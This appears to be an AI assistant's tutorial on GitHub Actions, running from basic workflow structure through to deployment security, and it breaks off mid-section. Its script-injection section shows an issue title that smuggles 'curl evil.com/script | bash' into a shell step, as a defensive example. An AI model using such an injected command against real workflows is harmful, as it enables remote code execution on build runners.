Yes. I checked the current official GitHub Actions documentation and the current major versions of the core GitHub-maintained actions. GitHub Actions is much easier once you build the correct mental model instead of memorizing YAML.

I’m going to teach it from **absolute zero → production CI/CD → reusable workflows → security → advanced architecture**. The official docs themselves are split into concepts, workflow syntax, runners, security, deployment, reuse, caching, artifacts, and references; I’m reorganizing those into the order that is easiest to learn. ([GitHub Docs][1])

---

# 1. What is GitHub Actions?

GitHub Actions is an **automation system inside GitHub**.

Imagine you normally do this manually:

```text
git pull
npm install
npm run lint
npm test
npm run build
docker build ...
docker push ...
deploy ...
```

GitHub Actions lets GitHub do these things automatically.

For example:

```text
Developer pushes code
        ↓
GitHub notices the push
        ↓
Start GitHub Actions workflow
        ↓
Create a machine
        ↓
Download repository
        ↓
Install dependencies
        ↓
Run tests
        ↓
Build application
        ↓
Deploy application
```

This is why GitHub Actions is commonly used for:

```text
CI  = Continuous Integration
CD  = Continuous Delivery / Deployment
```

But GitHub Actions is not only CI/CD. It can automate almost anything triggered by repository activity, schedules, manual execution, APIs, issues, pull requests, releases, and other events. ([GitHub Docs][2])

---

# 2. The most important mental model

Memorize this:

```text
EVENT
  ↓
WORKFLOW
  ↓
JOBS
  ↓
STEPS
  ↓
RUN / ACTION
```

And underneath it:

```text
JOB
 ↓
RUNNER
 ↓
Machine executing the job
```

So:

```text
Event
   ↓
Workflow
   ├── Job A
   │     ├── Step 1
   │     ├── Step 2
   │     └── Step 3
   │
   └── Job B
         ├── Step 1
         └── Step 2
```

This hierarchy is the single most important thing to understand.

GitHub defines a workflow as an automated process containing one or more jobs. A job contains steps, and each step either executes shell commands or runs an action. ([GitHub Docs][3])

---

# 3. Workflow

A **workflow** is the complete automation.

You create workflow files here:

```text
.github/
└── workflows/
    ├── ci.yml
    ├── deploy.yml
    └── release.yml
```

Workflow files are YAML:

```yaml
name: CI

on:
  push:

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - run: echo "Hello"
```

Officially, workflow files must be `.yml` or `.yaml` files inside:

```text
.github/workflows/
```

([GitHub Docs][3])

---

# 4. Event / Trigger

The question here is:

> **When should this workflow start?**

That is controlled by:

```yaml
on:
```

Example:

```yaml
on:
  push:
```

Meaning:

```text
someone pushes
       ↓
run workflow
```

You can listen to many events.

For example:

```yaml
on:
  push:
  pull_request:
```

Now either event can start the workflow. ([GitHub Docs][4])

---

# 5. Common triggers you need to know

## Push

```yaml
on:
  push:
```

Run after commits are pushed.

Usually you restrict it:

```yaml
on:
  push:
    branches:
      - main
```

Meaning:

```text
push feature/foo
      ↓
nothing

push main
      ↓
workflow runs
```

---

## Pull request

```yaml
on:
  pull_request:
```

Very common for CI.

For example:

```text
developer opens PR
        ↓
lint
test
build
```

You can restrict the target branch:

```yaml
on:
  pull_request:
    branches:
      - main
```

This means:

> Run when a PR is targeting `main`.

Not necessarily when the PR branch itself is called `main`.

This distinction is important. ([GitHub Docs][4])

---

## Manual workflow

```yaml
on:
  workflow_dispatch:
```

GitHub shows a:

```text
Run workflow
```

button.

You can even define inputs:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: Environment
        required: true
        type: choice
        options:
          - staging
          - production
```

Then:

```yaml
${{ inputs.environment }}
```

gives you the selected value.

---

## Schedule

For cron jobs:

```yaml
on:
  schedule:
    - cron: "0 0 * * *"
```

Good for things such as:

```text
nightly tests
dependency checks
reports
database maintenance
scheduled deployments
```

---

## Reusable workflow

```yaml
on:
  workflow_call:
```

This means:

> This workflow can be called by another workflow.

We will return to this later because it is very important for large companies. ([GitHub Docs][5])

---

# 6. Jobs

Inside:

```yaml
jobs:
```

you define jobs.

Example:

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
```

Conceptually:

```text
WORKFLOW
    │
    ├── lint job
    │
    └── test job
```

Now there is an extremely important rule.

## Jobs are parallel by default

This:

```yaml
jobs:
  lint:
    ...

  test:
    ...

  build:
    ...
```

roughly means:

```text
        ┌─ lint
start ──┼─ test
        └─ build
```

They can run simultaneously.

They do **not** automatically wait for each other. ([GitHub Docs][2])

Memorize:

> **Steps are normally sequential. Jobs are normally parallel.**

---

# 7. `needs`

What if you want:

```text
test
 ↓
build
 ↓
deploy
```

Use:

```yaml
needs:
```

Example:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: npm run build

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

Graph:

```text
test
 ↓
build
 ↓
deploy
```

Without `needs`:

```text
test ──┐
build ─┼─ running concurrently
deploy ┘
```

With `needs`:

```text
test → build → deploy
```

`needs` creates the dependency graph.

This is one of the most important GitHub Actions concepts. ([GitHub Docs][3])

---

# 8. Runner

Now we reach another critical concept.

A **runner** is the machine that actually executes your job.

Think:

```text
GitHub Actions
    =
orchestrator / controller

Runner
    =
worker machine
```

Your YAML says:

```yaml
runs-on: ubuntu-latest
```

GitHub provides a VM.

Your commands execute there.

For example:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
```

roughly:

```text
GitHub
   ↓
create Ubuntu VM
   ↓
send job
   ↓
VM executes steps
```

GitHub provides hosted runners such as:

```text
ubuntu
windows
macOS
```

([GitHub Docs][6])

---

# 9. Important runner rule

Each job normally gets its **own machine** when using GitHub-hosted runners.

Example:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

  deploy:
    runs-on: ubuntu-latest
```

Think:

```text
build
  ↓
VM A

deploy
  ↓
VM B
```

Not:

```text
build
deploy
   ↓
same VM
```

This explains many beginner bugs.

For example:

```yaml
build:
  steps:
    - run: npm run build
```

produces:

```text
dist/
```

Then another job:

```yaml
deploy:
  steps:
    - run: ls dist
```

may not find it.

Why?

Because:

```text
build machine

/dist
```

is different from:

```text
deploy machine

/dist  ← does not exist
```

GitHub-hosted runners are provisioned per job, while steps belonging to the same job share that job's filesystem. ([GitHub Docs][7])

---

# 10. Steps

Inside a job:

```yaml
steps:
```

Example:

```yaml
steps:
  - run: echo "A"

  - run: echo "B"

  - run: echo "C"
```

Normally:

```text
A
↓
B
↓
C
```

Steps in a job execute in order. ([GitHub Docs][2])

---

# 11. Two main types of steps

You will constantly see:

```text
run
```

and:

```text
uses
```

They are different.

---

# 12. `run`

`run` means:

> Execute a shell command.

Example:

```yaml
- run: npm install
```

or:

```yaml
- run: |
    npm install
    npm run lint
    npm test
```

Basically GitHub opens a shell and executes your commands.

---

# 13. `uses`

`uses` means:

> Run reusable automation somebody already created.

Example:

```yaml
- uses: actions/checkout@v7
```

This is an **Action**.

It downloads your repository into the runner.

Without checkout, the machine doesn't magically have your repository files.

Another example:

```yaml
- uses: actions/setup-node@v7
  with:
    node-version: 24
```

This configures Node.js.

As of September 2026, `actions/checkout` v7 and `actions/setup-node` v7 are the current major generations. ([GitHub][8])

---

# 14. Action

An **Action** is a reusable unit of automation.

Think of it like a function.

Instead of writing:

```yaml
- run: |
    download node
    extract node
    configure PATH
    configure npm
    ...
```

you write:

```yaml
- uses: actions/setup-node@v7
```

Like:

```text
function setupNode() {
   ...
}
```

GitHub describes actions as reusable units that reduce duplicated automation logic. ([GitHub Docs][9])

---

# 15. `with`

Actions can accept parameters.

Example:

```yaml
- uses: actions/setup-node@v7
  with:
    node-version: 24
```

Think:

```text
setupNode(
    nodeVersion = 24
)
```

So:

```yaml
uses:
```

means what action to execute.

And:

```yaml
with:
```

means arguments sent to that action.

---

# 16. Complete beginner workflow

Now this should start making sense:

```yaml
name: CI

on:
  push:
    branches:
      - main

  pull_request:
    branches:
      - main

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout source
        uses: actions/checkout@v7

      - name: Setup Node
        uses: actions/setup-node@v7
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Test
        run: npm test

      - name: Build
        run: npm run build
```

Mentally translate it:

```text
name: CI
        ↓
this automation is called CI

on:
        ↓
when should it execute?

push / pull_request
        ↓
events

jobs:
        ↓
what large pieces of work?

test:
        ↓
one job

runs-on:
        ↓
what machine?

ubuntu-latest

steps:
        ↓
what should the machine do?

checkout
setup node
install
lint
test
build
```

If you understand this, you understand the foundation.

---

# 17. YAML hierarchy matters

This:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
```

is hierarchy.

Think:

```text
jobs
└── test
    ├── runs-on
    └── steps
        └── run
```

Most GitHub Actions YAML errors are actually:

```text
wrong hierarchy
wrong indentation
keyword used at wrong level
```

The official workflow reference shows that keywords are attached to specific levels such as:

```text
workflow
jobs.<job_id>
jobs.<job_id>.steps
```

([GitHub Docs][3])

---

# 18. The different levels

Memorize this tree:

```text
workflow
│
├── name
├── run-name
├── on
├── permissions
├── env
├── defaults
├── concurrency
│
└── jobs
    │
    └── job
        │
        ├── name
        ├── needs
        ├── if
        ├── runs-on
        ├── permissions
        ├── environment
        ├── concurrency
        ├── outputs
        ├── env
        ├── strategy
        ├── container
        ├── services
        │
        └── steps
            │
            ├── name
            ├── id
            ├── if
            ├── uses
            ├── run
            ├── with
            ├── env
            ├── shell
            ├── working-directory
            ├── timeout-minutes
            └── continue-on-error
```

This corresponds closely to the official workflow syntax hierarchy. ([GitHub Docs][3])

---

# 19. Environment variables

Suppose you have:

```yaml
env:
  NODE_ENV: test
```

Then:

```yaml
- run: echo "$NODE_ENV"
```

prints:

```text
test
```

You can define `env` at several levels.

Workflow:

```yaml
env:
  NODE_ENV: test
```

Available broadly.

Job:

```yaml
jobs:
  test:
    env:
      NODE_ENV: test
```

Available to that job.

Step:

```yaml
- run: npm test
  env:
    NODE_ENV: test
```

Available to that step.

Think scope:

```text
workflow env
    ↓
jobs
    ↓
steps
```

More-specific values can override broader ones.

---

# 20. Variables vs environment variables

There are several similar things, which creates confusion.

## `env`

Workflow environment values:

```yaml
env:
  NODE_ENV: production
```

Access expression:

```yaml
${{ env.NODE_ENV }}
```

Shell:

```bash
$NODE_ENV
```

---

# 21. `vars`

GitHub configuration variables can be stored at repository, organization, or environment level.

Example:

```text
API_URL=https://api.example.com
```

Use:

```yaml
${{ vars.API_URL }}
```

Use `vars` for configuration that is **not secret**.

([GitHub Docs][10])

---

# 22. `secrets`

Use secrets for sensitive data.

Example:

```text
DATABASE_PASSWORD
API_TOKEN
DEPLOY_TOKEN
```

Use:

```yaml
${{ secrets.DATABASE_PASSWORD }}
```

Do not do:

```yaml
env:
  PASSWORD: my-super-secret-password
```

because the workflow YAML is stored in Git.

Secrets can exist at:

```text
organization
repository
environment
```

GitHub encrypts stored Actions secrets and makes them available only when workflows explicitly reference them. ([GitHub Docs][11])

---

# 23. Contexts

This is one of the biggest topics.

GitHub provides objects containing information.

Examples:

```text
github
env
vars
secrets
runner
job
steps
needs
matrix
strategy
inputs
```

These are called **contexts**. ([GitHub Docs][10])

---

# 24. `github` context

Example:

```yaml
${{ github.repository }}
```

Could return:

```text
octocat/my-app
```

Other examples:

```yaml
${{ github.actor }}
${{ github.sha }}
${{ github.ref }}
${{ github.event_name }}
${{ github.event.pull_request.title }}
```

Think:

```text
github
│
├── actor
├── repository
├── sha
├── ref
└── event
```

It's an object.

So:

```yaml
github.repository
```

means:

```javascript
github.repository
```

similar to JavaScript object access.

---

# 25. Expressions

This:

```yaml
${{ ... }}
```

means:

> GitHub, evaluate this expression.

Example:

```yaml
${{ github.ref }}
```

Or:

```yaml
${{ github.ref == 'refs/heads/main' }}
```

Expressions can contain values, operators, context references, and functions. ([GitHub Docs][12])

---

# 26. `if`

Example:

```yaml
- name: Deploy
  if: github.ref == 'refs/heads/main'
  run: ./deploy.sh
```

Means:

```text
IF branch == main

    deploy
```

Otherwise skip the step.

You can also put `if` on jobs.

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
```

---

# 27. Step `id`

Consider:

```yaml
- name: Generate version
  id: version
  run: echo "value=1.2.3" >> "$GITHUB_OUTPUT"
```

The `id` gives the step an internal identifier:

```text
version
```

Then another step can access its output:

```yaml
${{ steps.version.outputs.value }}
```

Structure:

```text
steps
└── version
    └── outputs
        └── value
```

This pattern becomes extremely important.

---

# 28. `$GITHUB_OUTPUT`

Inside shell code:

```bash
echo "version=1.2.3" >> "$GITHUB_OUTPUT"
```

creates an output.

Example:

```yaml
- id: build-info
  run: |
    echo "version=1.2.3" >> "$GITHUB_OUTPUT"

- run: |
    echo "${{ steps.build-info.outputs.version }}"
```

GitHub workflow commands and environment files allow steps to communicate values back to the runner and workflow engine. ([GitHub Docs][13])

---

# 29. Passing output between jobs

Suppose:

```text
Job A generates version
Job B needs version
```

You cannot directly do:

```yaml
steps.some-step.outputs.version
```

from Job B.

Why?

Because that step belongs to Job A.

Instead:

```text
Step output
     ↓
Job output
     ↓
needs
     ↓
Other job
```

Example:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

    outputs:
      version: ${{ steps.version.outputs.value }}

    steps:
      - id: version
        run: echo "value=1.2.3" >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-latest

    steps:
      - run: echo "${{ needs.build.outputs.version }}"
```

Mental model:

```text
build job
   │
   └── step output
         ↓
    build.outputs.version
         ↓
needs.build.outputs.version
         ↓
deploy
```

---

# 30. `needs` context

If:

```yaml
deploy:
  needs: build
```

you get:

```yaml
${{ needs.build.outputs.version }}
```

and information about its result.

Conceptually:

```text
needs
└── build
    ├── result
    └── outputs
```

---

# 31. Matrix

Now we enter intermediate GitHub Actions.

Suppose you need to test:

```text
Node 20
Node 22
Node 24
```

You could write three jobs.

Bad:

```yaml
node20:
node22:
node24:
```

Better:

```yaml
strategy:
  matrix:
    node:
      - 20
      - 22
      - 24
```

Then:

```yaml
node-version: ${{ matrix.node }}
```

Full example:

```yaml
jobs:
  test:
    strategy:
      matrix:
        node: [20, 22, 24]

    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}

      - run: npm ci
      - run: npm test
```

GitHub expands this into:

```text
test(node=20)
test(node=22)
test(node=24)
```

They can run in parallel. ([GitHub Docs][2])

---

# 32. Matrix with multiple dimensions

```yaml
matrix:
  os:
    - ubuntu-latest
    - windows-latest

  node:
    - 22
    - 24
```

Produces:

```text
Ubuntu + Node 22
Ubuntu + Node 24
Windows + Node 22
Windows + Node 24
```

That is a Cartesian product:

```text
2 OS × 2 Node versions = 4 jobs
```

---

# 33. `include` / `exclude`

Sometimes a combination should not run.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [22, 24]

    exclude:
      - os: windows-latest
        node: 22
```

You can also add special combinations with:

```yaml
include:
```

---

# 34. Artifacts

Suppose build generates:

```text
dist/app.js
```

and you want to keep it after the job finishes.

Use an **artifact**.

Example:

```yaml
- uses: actions/upload-artifact@v7
  with:
    name: app
    path: dist/
```

Later another job can download it.

Artifacts are intended for things produced by workflows such as:

```text
binaries
dist/
test reports
coverage reports
screenshots
logs
packages
```

([GitHub Docs][14])

---

# 35. Artifacts solve the separate-machine problem

Remember:

```text
Job A → VM A
Job B → VM B
```

So:

```text
VM A filesystem
```

is not automatically available in:

```text
VM B filesystem
```

Artifacts provide:

```text
Job A
   ↓
upload artifact
   ↓
GitHub artifact storage
   ↓
download artifact
   ↓
Job B
```

This is very important.

---

# 36. Cache

Cache looks similar to artifacts but solves a different problem.

Suppose every workflow downloads:

```text
500 MB dependencies
```

Again and again.

Cache can reuse them.

Use cache for things expensive to regenerate:

```text
npm cache
Maven dependencies
Gradle dependencies
Go modules
build caches
```

GitHub explicitly distinguishes:

```text
Artifact
    =
keep/output/share result

Cache
    =
speed up future workflow runs
```

([GitHub Docs][15])

Memorize:

> **Artifact = result. Cache = optimization.**

---

# 37. Cache keys

Cache needs to know when dependencies change.

Example:

```yaml
key: npm-${{ hashFiles('package-lock.json') }}
```

If:

```text
package-lock.json
```

changes, its hash changes:

```text
npm-a8923...
```

becomes:

```text
npm-f82bc...
```

Therefore GitHub creates a different cache.

This avoids restoring dependencies for the wrong lockfile. ([GitHub Docs][16])

---

# 38. Containers

There are actually several container concepts.

You can run an entire job inside a container:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest

    container:
      image: node:24
```

Architecture:

```text
GitHub runner VM
        ↓
Docker container
        ↓
steps execute there
```

Without `container`, steps execute directly on the runner host. ([GitHub Docs][17])

---

# 39. Service containers

This is extremely useful for integration tests.

Imagine your application needs:

```text
PostgreSQL
Redis
```

You can start them beside your job.

Conceptually:

```text
Runner
│
├── your job
│
├── PostgreSQL container
│
└── Redis container
```

Workflow syntax supports:

```yaml
services:
```

For example:

```yaml
services:
  postgres:
    image: postgres:17
```

Then integration tests can communicate with that database.

The workflow syntax includes first-class job `services` configuration with image, environment, ports, volumes, and options. ([GitHub Docs][3])

---

# 40. Reusable workflows

Suppose 20 repositories contain:

```text
checkout
setup node
npm ci
lint
test
build
docker
deploy
```

Copy/pasting this everywhere becomes painful.

Instead create:

```text
central-ci.yml
```

with:

```yaml
on:
  workflow_call:
```

Then repositories call it:

```yaml
jobs:
  ci:
    uses: company/platform/.github/workflows/node-ci.yml@main
```

Important:

This `uses` is at the **job level**.

Different from:

```yaml
steps:
  - uses: actions/checkout@v7
```

Very important distinction:

```text
steps[*].uses
    ↓
Action

jobs.<job>.uses
    ↓
Reusable workflow
```

([GitHub Docs][5])

---

# 41. Inputs to reusable workflows

Reusable workflow:

```yaml
on:
  workflow_call:
    inputs:
      node-version:
        required: true
        type: number
```

Caller:

```yaml
jobs:
  ci:
    uses: company/ci/.github/workflows/node.yml@main

    with:
      node-version: 24
```

Now you have reusable CI infrastructure.

---

# 42. Composite actions vs reusable workflows

This confuses many developers.

Think:

```text
Composite action
   =
reuse STEPS

Reusable workflow
   =
reuse JOBS / workflow structure
```

Example:

### Composite Action

```text
checkout?
setup dependencies
run commands
```

Used from:

```yaml
steps:
  - uses: ./some-action
```

### Reusable workflow

Can define:

```text
multiple jobs
runners
matrix
permissions
environments
deployment flow
```

Used from:

```yaml
jobs:
  something:
    uses: ...
```

Memorize this difference.

---

# 43. Custom Actions

You can create actions yourself.

GitHub supports different action styles including reusable code and container-based actions.

Conceptually:

```text
Custom Action
├── JavaScript action
├── Docker container action
└── Composite action
```

An action has metadata such as:

```text
action.yml
```

which describes:

```text
name
description
inputs
outputs
runs
```

The official Actions reference contains separate metadata and Dockerfile specifications for building these reusable actions. ([GitHub Docs][18])

---

# 44. Environment

GitHub **environments** are not the same thing as environment variables.

Environment:

```text
development
staging
production
```

Example:

```yaml
deploy:
  environment: production
```

An environment can contain:

```text
environment secrets
environment variables
deployment approvals
branch restrictions
protection rules
```

([GitHub Docs][19])

This lets you build:

```text
build
 ↓
test
 ↓
deploy staging
 ↓
manual approval
 ↓
deploy production
```

---

# 45. Production approval

For example:

```yaml
deploy:
  environment: production
```

If `production` requires approval:

```text
workflow reaches deploy
       ↓
PAUSED
       ↓
authorized reviewer approves
       ↓
environment secrets become available
       ↓
deployment starts
```

This is significantly safer than putting deployment secrets everywhere. ([GitHub Docs][19])

---

# 46. Concurrency

Imagine developers push:

```text
commit A
commit B
commit C
```

quickly.

Without control:

```text
deploy A
deploy B
deploy C
```

might all run.

Bad.

Use:

```yaml
concurrency:
  group: production
  cancel-in-progress: true
```

Then an older run can be canceled when a newer one supersedes it.

Concurrency exists because GitHub normally allows jobs and workflow runs to execute simultaneously. ([GitHub Docs][20])

Very useful for:

```text
deployments
CI on fast-changing branches
expensive builds
shared infrastructure
```

---

# 47. `permissions`

This is extremely important.

GitHub automatically creates:

```text
GITHUB_TOKEN
```

for workflow jobs.

You should restrict its permissions.

Example:

```yaml
permissions:
  contents: read
```

Instead of giving broad write power.

GitHub's `GITHUB_TOKEN` is an installation access token tied to the repository and generated for workflow jobs. ([GitHub Docs][21])

Think:

```text
workflow
   ↓
temporary GitHub credential
   ↓
GITHUB_TOKEN
```

---

# 48. Principle of least privilege

If your workflow only needs to read repository code:

```yaml
permissions:
  contents: read
```

Don't give:

```text
write everything
```

Security principle:

> Give automation only the permissions it actually needs.

GitHub explicitly recommends least privilege for workflow credentials and secrets. ([GitHub Docs][22])

---

# 49. OIDC

Now we enter hero-level deployment security.

Old approach:

```text
GitHub Secret

AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
```

Those are long-lived credentials.

Better:

```text
GitHub Workflow
      ↓
OIDC identity token
      ↓
Cloud provider verifies GitHub
      ↓
temporary cloud credential
```

No permanent AWS secret stored in GitHub.

This is **OpenID Connect — OIDC**. ([GitHub Docs][23])

---

# 50. OIDC permission

Workflow normally needs:

```yaml
permissions:
  id-token: write
  contents: read
```

Important:

```yaml
id-token: write
```

does **not** mean arbitrary write access.

It permits the job to request the OIDC identity token. ([GitHub Docs][24])

---

# 51. Why OIDC is better

Long-lived secret:

```text
secret stolen
    ↓
attacker may keep using it
```

OIDC:

```text
workflow starts
    ↓
temporary identity
    ↓
cloud issues short-lived credential
    ↓
job ends
```

Much smaller credential exposure.

That's why modern cloud deployments should generally prefer OIDC when the destination supports it. ([GitHub Docs][23])

---

# 52. Script injection — extremely important

Consider:

```yaml
- run: echo "${{ github.event.issue.title }}"
```

Imagine attacker creates issue title:

```text
hello"; curl evil.com/script | bash; echo "
```

Some GitHub event/context data can be controlled by users.

If you insert that data directly into shell scripts, you can accidentally turn data into executable code.

GitHub specifically warns that context values such as issue titles, PR bodies, branch-related strings, names, messages, and other externally controlled properties may be untrusted. ([GitHub Docs][25])

Think:

```text
untrusted text
      ↓
directly inserted into shell
      ↓
possible command execution
```

Very important security lesson:

> **Data must remain data. Never accidentally turn untrusted data into code.**

---

# 53. `pull_request_target`

You should treat this event very carefully:

```yaml
pull_request_target:
```

Why?

It can execute with the security context of the target/base repository.

The classic dangerous pattern is:

```text
untrusted fork PR
       +
production secrets / privileged token
       +
checkout attacker code
       ↓
disaster
```

GitHub tightened `actions/checkout` v7 in 2026 so fork PR code is refused by default for dangerous contexts such as `pull_request_target` and `workflow_run`, specifically to reduce this class of "pwn request" vulnerability. ([GitHub][26])

Do not casually combine:

```text
pull_request_target
+
fork source checkout
+
secrets
```

---

# 54. Third-party Actions

For example:

```yaml
uses: some-company/some-action@v1
```

That code executes on your runner.

Therefore treat actions like dependencies.

A malicious action could theoretically:

```text
read available secrets
modify files
send network requests
use GITHUB_TOKEN
```

For high-security environments, pin actions to immutable commit SHAs and keep them updated. GitHub's secure-use guidance recommends carefully managing third-party actions and using dependency-update tooling such as Dependabot. ([GitHub Docs][22])

---

# 55. Self-hosted runners

Instead of:

```yaml
runs-on: ubuntu-latest
```

you can operate your own machine.

Example:

```yaml
runs-on:
  - self-hosted
  - linux
  - x64
```

Possible machine:

```text
your EC2
your office server
VM
physical server
Kubernetes worker
GPU machine
```

GitHub sends work to that machine. ([GitHub Docs][27])

---

# 56. Why use self-hosted runner?

Advantages:

```text
custom hardware
GPU
private network
internal services
special software
faster builds
no repeated machine provisioning
```

But you become responsible for:

```text
OS security
patching
isolation
cleanup
network security
capacity
runner lifecycle
```

And unlike clean GitHub-hosted machines, a self-hosted runner does not necessarily start clean for every job. ([GitHub Docs][27])

This is a major security difference.

---

# 57. Service architecture of GitHub Actions

At a deeper level, think of GitHub Actions as:

```text
                    GitHub
                       │
                 Event received
                       │
               Workflow engine
                       │
              Build job graph
                       │
             Queue runnable jobs
                       │
        ┌──────────────┴──────────────┐
        ↓                             ↓
GitHub-hosted runner           Self-hosted runner
        │                             │
        ↓                             ↓
 execute steps                  execute steps
        │                             │
        └──────────────┬──────────────┘
                       ↓
                  Job result
                       ↓
                Workflow result
```

GitHub is the orchestrator.

The runner is the worker.

That distinction is fundamental.

---

# 58. Workflow commands

A process running on the runner sometimes needs to communicate with GitHub Actions.

Examples:

```text
create output
set environment variable
mask sensitive value
add PATH
create warning
create error
create job summary
```

That is what **workflow commands/environment files** provide. ([GitHub Docs][13])

For example:

```bash
echo "VERSION=1.2.3" >> "$GITHUB_ENV"
```

makes an environment variable available to later steps.

---

# 59. `GITHUB_ENV` vs `GITHUB_OUTPUT`

Memorize this.

## Environment variable for later steps

```bash
echo "VERSION=1.2.3" >> "$GITHUB_ENV"
```

Later:

```bash
echo "$VERSION"
```

---

## Step output

```bash
echo "version=1.2.3" >> "$GITHUB_OUTPUT"
```

Later:

```yaml
${{ steps.my-step.outputs.version }}
```

Different purposes.

---

# 60. Status functions

You will eventually use conditions like:

```yaml
if: success()
```

```yaml
if: failure()
```

```yaml
if: always()
```

```yaml
if: cancelled()
```

For example:

```yaml
- name: Upload test logs
  if: failure()
```

Meaning:

```text
tests failed
    ↓
upload debug logs
```

Very useful for cleanup and diagnostics.

Expressions support functions, operators, object access, and status checks. ([GitHub Docs][28])

---

# 61. `continue-on-error`

Normally:

```text
step fails
   ↓
job fails
```

But:

```yaml
- run: npm run experimental-test
  continue-on-error: true
```

means:

```text
this step failed

but continue
```

Be careful.

People sometimes use this to hide real failures.

---

# 62. `timeout-minutes`

Never allow automation to hang forever.

Example:

```yaml
jobs:
  test:
    timeout-minutes: 15
```

or step-level timeout:

```yaml
- run: npm test
  timeout-minutes: 10
```

The workflow syntax supports timeouts at both step and job levels. ([GitHub Docs][3])

---

# 63. `working-directory`

Instead of:

```yaml
- run: cd backend && npm test
```

you can do:

```yaml
- run: npm test
  working-directory: backend
```

Useful for monorepos.

---

# 64. `defaults`

Instead of repeating:

```yaml
working-directory: backend
```

everywhere:

```yaml
defaults:
  run:
    working-directory: backend
```

Now `run` steps use that directory by default.

---

# 65. Monorepo path filtering

Imagine:

```text
apps/
  frontend/
  backend/
```

Backend CI shouldn't run every time documentation changes.

You can use:

```yaml
on:
  push:
    paths:
      - "backend/**"
```

Or:

```yaml
paths-ignore:
  - "docs/**"
```

GitHub supports branch, tag, and path filtering for relevant triggers. ([GitHub Docs][4])

---

# 66. But be careful with required checks

There is a subtle issue.

If branch protection requires a workflow check, but path filtering causes the workflow not to run, its check can remain pending and block merging in some configurations.

GitHub explicitly warns about using branch/path filtering with required checks. ([GitHub Docs][3])

This is the kind of detail people encounter only after using Actions seriously.

---

# 67. Real production pipeline

A mature pipeline often looks like:

```text
                         push / PR
                             │
                    ┌────────┴────────┐
                    ↓                 ↓
                   lint              test
                    │                 │
                    └────────┬────────┘
                             ↓
                            build
                             ↓
                     security scan
                             ↓
                       image build
                             ↓
                      artifact/image
                             ↓
                    deploy staging
                             ↓
                  integration / smoke
                             ↓
                    approval gate
                             ↓
                   deploy production
                             ↓
                     smoke tests
```

That is fundamentally just:

```text
events
jobs
needs
conditions
artifacts
environments
permissions
```

No magic.

---

# 68. Example of a better CI workflow

```yaml
name: CI

on:
  pull_request:
    branches:
      - main

  push:
    branches:
      - main

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  quality:
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Setup Node
        uses: actions/setup-node@v7
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Test
        run: npm test

  build:
    needs: quality

    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Setup Node
        uses: actions/setup-node@v7
        with:
          node-version: 24
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Upload application
        uses: actions/upload-artifact@v7
        with:
          name: application
          path: dist/
```

Architecture:

```text
push / PR
    ↓
quality
 ├─ checkout
 ├─ setup
 ├─ npm ci
 ├─ lint
 └─ test
    ↓
build
 ├─ checkout
 ├─ setup
 ├─ npm ci
 ├─ build
 └─ artifact
```

---

# 69. Why `npm ci`, not `npm install`?

For CI, normally prefer:

```bash
npm ci
```

when you have `package-lock.json`.

Because the goal of CI is:

```text
same dependency tree
every time
```

not:

```text
possibly change dependency resolution
```

GitHub's current `setup-node` documentation also strongly recommends committing package-manager lockfiles for security and reproducibility. ([GitHub][29])

---

# 70. Artifact attestations

This is a more advanced modern Actions feature.

Problem:

Someone downloads:

```text
my-app.tar.gz
```

How do they know:

```text
which repository built it?
which workflow built it?
which commit?
was it modified afterward?
```

Artifact attestations create cryptographically signed provenance information.

Conceptually:

```text
artifact
   +
signed statement:

"GitHub workflow X
 built this
 from commit Y
 in repository Z"
```

([GitHub Docs][30])

This belongs to software supply-chain security.

---

# 71. Hero-level security mindset

Whenever you design a workflow, ask:

```text
1. What caused this workflow to run?

2. Who controls the input?

3. What code will execute?

4. On what runner?

5. What secrets are available?

6. What permissions does GITHUB_TOKEN have?

7. Can untrusted code reach those secrets?

8. Is a third-party action executing?

9. Are dependencies/caches trusted?

10. Does deployment use long-lived credentials?

11. Can OIDC replace those credentials?

12. Can concurrent deployments conflict?
```

That is how experienced engineers think about CI/CD.

Not:

```text
"Does the YAML work?"
```

but:

```text
"What trust boundary am I creating?"
```

---

# 72. The deeper concept: GitHub Actions is a DAG executor

This is a very useful computer-science view.

Jobs:

```text
A
├── B
└── C
    │
    D
```

with dependencies:

```yaml
B:
  needs: A

C:
  needs: A

D:
  needs:
    - B
    - C
```

Form a:

> **Directed Acyclic Graph — DAG**

Graph:

```text
       A
      / \
     B   C
      \ /
       D
```

GitHub's scheduler executes jobs whenever their dependencies are satisfied.

This mental model makes complicated workflows much easier to understand.

---

# 73. Three kinds of data movement

Another important model.

### Same job

```text
Step A
 ↓
filesystem / env / step output
 ↓
Step B
```

Because both steps use the same runner.

### Different jobs

```text
Job A
 ↓
job output / artifact
 ↓
Job B
```

